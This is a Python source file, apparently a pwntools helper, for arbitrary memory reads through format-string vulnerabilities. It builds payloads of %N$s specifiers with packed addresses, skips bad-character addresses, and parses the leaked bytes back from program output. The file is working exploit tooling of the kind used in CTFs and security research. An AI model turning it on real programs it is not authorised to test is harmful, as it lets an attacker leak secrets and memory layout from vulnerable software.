"""
FmtStrReader - Arbitrary memory reads via format string %s payloads.

Handles the tricky parts of using %s for format string reads:
  - %s stops at null bytes, so we send multiple %s (one per byte offset)
  - Addresses containing bad characters (e.g. \\n) are skipped
  - Overlapping leak windows let us recover skipped bytes when possible
  - Start/end sentinels let you find the leak in noisy output

Usage:
    from pwn import *
    reader = FmtStrReader(offset=6)
    leak = reader.payload(0x404060, count=8)
    raw = p.sendlineafter(b"> ", bytes(leak))
    data = reader.parse(raw)
"""

# NEEDS MORE TESTING BUT SEEMS TO WORK
# ADAPATED FROM MY DUMPELF WRITEUP
# WILL CHANGE WRITEUP TO USE THIS EVENTUALLY
# HAVE NOT TESTED BULK WRITES


from pwnlib.context import context
from pwnlib.log import getLogger
from pwnlib.util.packing import pack as _pwn_pack
import struct
import logging

log = getLogger(__name__)

def _pack_addr(addr):
    """Pack an address using the current pwntools context (arch/endian)."""
    return _pwn_pack(addr, word_size=context.bits)

def _word_size():
    return context.bytes

class FmtStrLeak:
    """
    Returned by FmtStrReader.payload(). Holds the payload bytes and all the
    metadata that parse() needs to reconstruct the leaked data.

    Use bytes(leak) or send it directly anywhere that accepts bytes.
    """

    def __init__(
        self,
        payload,
        count,
        skipped,
        delimiter,
        start_sentinel,
        end_sentinel,
        addr,
    ):
        self._payload = payload
        self.count = count
        self.skipped = skipped
        self.delimiter = delimiter
        self.start_sentinel = start_sentinel
        self.end_sentinel = end_sentinel
        self.addr = addr

    def __bytes__(self):
        return self._payload

    def __len__(self):
        return len(self._payload)

    def __repr__(self):
        skipped_str = f", skipped={sorted(self.skipped)}" if self.skipped else ""
        return (
            f"FmtStrLeak(addr={self.addr:#x}, count={self.count}"
            f"{skipped_str}, len={len(self._payload)})"
        )


class FmtStrReader:
    """
    Builds format string payloads that use multiple %s specifiers to do
    reliable arbitrary reads, and parses the results back into bytes.

    Args:
        offset:    The stack offset where your controlled input begins
                   (same meaning as pwntools FmtStr offset).
        padlen:    Number of bytes before your controlled input in the
                   format string buffer (e.g. if the binary prepends a
                   fixed prefix before your input). Default: 0.
        badchars:  Bytes that cannot appear in addresses placed on the stack.
                   Addresses containing any of these bytes are skipped.
                   Default: b"\\n"
        delimiter: Byte string placed between each %s output so we can split
                   the leak. Should be something unlikely to appear in leaked
                   data. Default: b"FMTLKDLM"
        start_sentinel: Marks the beginning of our leak region in output.
                        Default: b"FMTLKSTART"
        end_sentinel:   Marks the end of our leak region in output.
                        Default: b"FMTLKEND"
        warn:      If True, log warnings when bytes can't be recovered.
                   Default: True

    Note:
        Architecture (32/64-bit, endianness) is taken from pwntools context
        when available. Without pwntools, defaults to 64-bit little-endian.
    """

    def __init__(
        self,
        offset,
        padlen=0,
        badchars=b"\n",
        delimiter=b"FMTLKDLM",
        start_sentinel=b"FMTLKSTART",
        end_sentinel=b"FMTLKEND",
        warn=True,
    ):
        self.offset = offset
        self.padlen = padlen
        self.badchars = set(badchars)
        self.delimiter = delimiter
        self.start_sentinel = start_sentinel
        self.end_sentinel = end_sentinel
        self.warn = warn
        self._pending = None

    @property
    def _word_size(self):
        return _word_size()

    def payload(self, addr, count=8):
        """
        Build a format string payload to leak ``count`` bytes starting at ``addr``.

        The payload layout is::

            [start_sentinel] [%Ns delim %Ms delim ...] [end_sentinel]
            [null padding to word alignment]
            [packed addr+0] [packed addr+1] ...   (skipping bad addresses)

        The %N values are auto-calculated based on the actual length of the
        format string portion (like pwntools fmtstr_payload), so no fixed
        ljust padding is needed.

        Args:
            addr(int): Starting address to read from.
            count(int): Number of bytes to leak. Default: 8.

        Returns:
            FmtStrLeak: Object whose ``bytes()`` gives the raw payload.
        """
        word_size = self._word_size
        skipped = set()

        # Figure out which byte offsets have bad addresses
        for i in range(count):
            packed = _pack_addr(addr + i)
            if any(b in self.badchars for b in packed):
                skipped.add(i)

        non_skipped = [i for i in range(count) if i not in skipped]
        num_addrs = len(non_skipped)

        if num_addrs == 0:
            if self.warn:
                log.warning(
                    "All %d addresses at %#x contain bad characters. "
                    "Cannot build payload.", count, addr,
                )
            leak = FmtStrLeak(
                payload=b"",
                count=count,
                skipped=skipped,
                delimiter=self.delimiter,
                start_sentinel=self.start_sentinel,
                end_sentinel=self.end_sentinel,
                addr=addr,
            )
            self._pending = leak
            return leak

        # --- Build the format string prefix ---
        #
        # The prefix looks like:
        #   {start_sentinel}%A$s{delim}%B$s{delim}...%Z$s{end_sentinel}
        #
        # The %N$ values depend on the prefix length (because the addresses
        # are appended after prefix + alignment padding), but the prefix
        # length depends on %N$ values (more digits = longer string).
        #
        # We solve this iteratively, same approach as pwntools fmtstr_payload.

        def build_prefix(addr_offset_start):
            """Build the format string prefix given the stack word offset
            where the first packed address will land."""
            parts = [self.start_sentinel]
            for idx in range(num_addrs):
                stack_idx = addr_offset_start + idx
                parts.append(f"%{stack_idx}$s".encode())
                if idx < num_addrs - 1:
                    parts.append(self.delimiter)
            parts.append(self.end_sentinel)
            return b"".join(parts)

        # Iteratively solve for the correct offsets.
        guess_offset = self.offset + 20  # arbitrary initial guess
        for _ in range(20):  # converges in 2-3 iterations typically
            prefix = build_prefix(guess_offset)

            # Pad prefix to word alignment, accounting for padlen
            total_prefix = self.padlen + len(prefix)
            remainder = total_prefix % word_size
            if remainder != 0:
                pad_needed = word_size - remainder
            else:
                pad_needed = 0
            padded_prefix_len = len(prefix) + pad_needed

            # The addresses start at this word offset on the stack
            new_offset = self.offset + (self.padlen + padded_prefix_len) // word_size

            if new_offset == guess_offset:
                break
            guess_offset = new_offset
        else:
            log.warning("Offset calculation did not converge; using last value")

        # --- Assemble final payload ---
        prefix = build_prefix(guess_offset)

        # Null-pad to word alignment
        total_prefix = self.padlen + len(prefix)
        remainder = total_prefix % word_size
        if remainder != 0:
            prefix += b"\x00" * (word_size - remainder)

        # Append packed addresses
        addr_section = b"".join(_pack_addr(addr + i) for i in non_skipped)
        final_payload = prefix + addr_section

        leak = FmtStrLeak(
            payload=final_payload,
            count=count,
            skipped=skipped,
            delimiter=self.delimiter,
            start_sentinel=self.start_sentinel,
            end_sentinel=self.end_sentinel,
            addr=addr,
        )
        self._pending = leak
        return leak

    def parse(self, data, leak=None):
        """
        Parse raw output from the target and extract the leaked bytes.

        Args:
            data(bytes):  The raw bytes received from the target after sending
                          the format string payload.
            leak(FmtStrLeak): The FmtStrLeak object from payload(). If None,
                              uses the most recently created one.

        Returns:
            bytes: ``count`` bytes of leaked data. Unrecoverable bytes are \\x00.
        """
        if leak is None:
            leak = self._pending
        if leak is None:
            raise ValueError("No pending leak. Call payload() first or pass a FmtStrLeak.")

        count = leak.count
        skipped = leak.skipped

        # If everything was skipped, we have nothing
        if len(skipped) == count:
            if self.warn:
                log.warning("All %d bytes unrecoverable at %#x.", count, leak.addr)
            return b"\x00" * count

        # --- Extract the leak region using sentinels ---
        start_pos = data.find(leak.start_sentinel)
        end_pos = data.find(leak.end_sentinel)

        if start_pos == -1 or end_pos == -1:
            if self.warn:
                log.warning(
                    "Could not find start/end sentinels in output. "
                    "Attempting to parse raw data as-is."
                )
                log.warning(data)
            region = data
        else:
            region = data[start_pos + len(leak.start_sentinel):end_pos]

        # --- Split on delimiter ---
        chunks = region.split(leak.delimiter)

        # Build a mapping: byte_position -> chunk from %s
        non_skipped = [i for i in range(count) if i not in skipped]
        chunk_map = {}
        for ci, byte_idx in enumerate(non_skipped):
            if ci < len(chunks):
                chunk_map[byte_idx] = chunks[ci]
            else:
                chunk_map[byte_idx] = b""

        # --- Reconstruct bytes using overlapping leak windows ---
        #
        # If %s at addr+i returned N bytes, then positions i..i+N-1 are all
        # known from that single leak. We track a "cursor" — the farthest-
        # reaching leak — and use it to fill in both normal and skipped
        # positions.

        result = bytearray(count)
        unrecovered = 0
        cursor_start = -1
        cursor_data = b""

        for i in range(count):
            cursor_offset = i - cursor_start
            cursor_covers = (
                cursor_start >= 0
                and cursor_offset < len(cursor_data)
            )

            if i not in skipped:
                chunk = chunk_map.get(i, b"")

                if chunk:
                    result[i] = chunk[0]
                    # Update cursor if this leak reaches farther
                    if not cursor_covers or (i + len(chunk)) > (cursor_start + len(cursor_data)):
                        cursor_start = i
                        cursor_data = chunk
                else:
                    # %s returned empty -> null byte at this address
                    result[i] = 0
            else:
                # Skipped position — try to recover from cursor
                if cursor_covers:
                    result[i] = cursor_data[cursor_offset]
                else:
                    result[i] = 0
                    unrecovered += 1

        if unrecovered > 0 and self.warn:
            log.warning(
                "%d/%d byte(s) at %#x could not be recovered "
                "(addresses contained bad characters and no covering "
                "leak was available). Set to \\x00.",
                unrecovered, count, leak.addr,
            )

        return bytes(result)

__all__ = ["FmtStrReader"]